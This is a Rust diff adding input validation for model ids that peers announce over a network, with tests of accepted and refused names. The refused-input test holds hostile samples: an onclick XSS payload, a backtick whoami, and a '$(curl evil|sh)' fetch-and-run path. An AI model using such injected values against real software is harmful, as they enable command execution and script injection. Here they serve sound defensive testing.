@@ -371,6 +371,33 @@ pub fn is_compatible(request: &str, provider: &str) -> bool {
     pairs.iter().all(|(r, p)| *r == WILDCARD || r == p)
 }
 
+/// Longest model name a peer may announce.
+pub const MAX_MODEL_ID_LEN: usize = 128;
+
+/// Is `id` an acceptable model name to announce or accept from the network?
+///
+/// Model names travel from any peer into other nodes' gateways, coding tools and the desktop UI, so
+/// they are held to the characters real engine ids use: ASCII letters and digits, `. _ : / @ + -`,
+/// and single spaces between words (ComfyUI workflow names). 1–[`MAX_MODEL_ID_LEN`] bytes, starting
+/// with a letter or digit. Quotes, `<`, `>`, backticks, `$`, `\`, `;`, `|`, `&`, `#`, `%`, control
+/// and non-ASCII characters are refused, as are leading/trailing and double spaces.
+pub fn is_valid_model_id(id: &str) -> bool {
+    let b = id.as_bytes();
+    if b.is_empty() || b.len() > MAX_MODEL_ID_LEN || !b[0].is_ascii_alphanumeric() {
+        return false;
+    }
+    if b[b.len() - 1] == b' ' || id.contains("  ") {
+        return false;
+    }
+    b.iter()
+        .all(|c| c.is_ascii_alphanumeric() || matches!(c, b'.' | b'_' | b':' | b'/' | b'@' | b'+' | b'-' | b' '))
+}
+
+/// A record's optional canonical id: empty (a legacy peer that announces none), or a valid name.
+pub fn is_valid_canonical_field(id: &str) -> bool {
+    id.is_empty() || is_valid_model_id(id)
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -577,5 +604,60 @@ mod tests {
             "qwen3.5/2b/fp16/abcabcabcabcabca",
             "garbage"
         ));
+    }
+
+    #[test]
+    fn model_id_validation_accepts_real_engine_ids() {
+        for id in [
+            "qwen2.5:7b",
+            "llama3.1:8b-instruct-q4_K_M",
+            "library/qwen3:latest",
+            "hf.co/bartowski/Qwen2.5-7B-Instruct-GGUF:Q4_K_M",
+            "Qwen/Qwen2.5-7B-Instruct",
+            "mlx-community/Llama-3.2-3B-Instruct-4bit",
+            "qwen2.5-7b-instruct@q4_k_m",
+            "gemma-3-4b-it-Q4_K_M.gguf",
+            "sd_xl_base_1.0.safetensors",
+            "flux1-dev-fp8 workflow",
+            "qwen3.5/2b/fp16/9f2c8a1b4d6e0f37",
+            "openhydra-qwen3.5-2b",
+            "0",
+        ] {
+            assert!(is_valid_model_id(id), "{id} should be accepted");
+        }
+    }
+
+    #[test]
+    fn model_id_validation_refuses_markup_shell_and_control_characters() {
+        let long = "a".repeat(MAX_MODEL_ID_LEN + 1);
+        for id in [
+            "",
+            " qwen",
+            "qwen ",
+            "qwen  2",
+            "x\" onclick=\"alert(1)\"",
+            "it's",
+            "<img src=x>",
+            "`whoami`",
+            "~/$(curl evil|sh)/qwen.gguf",
+            "/Users/me/models/qwen.gguf",
+            "C:\\models\\qwen.gguf",
+            "a;b",
+            "a|b",
+            "a&b",
+            "a#b",
+            "a%20b",
+            "line\nbreak",
+            "tab\there",
+            "qwén",
+            "-rf",
+            ".hidden",
+            long.as_str(),
+        ] {
+            assert!(!is_valid_model_id(id), "{id:?} should be refused");
+        }
+        assert!(is_valid_model_id(&"a".repeat(MAX_MODEL_ID_LEN)));
+        assert!(is_valid_canonical_field(""));
+        assert!(!is_valid_canonical_field("a\"b"));
     }
 }
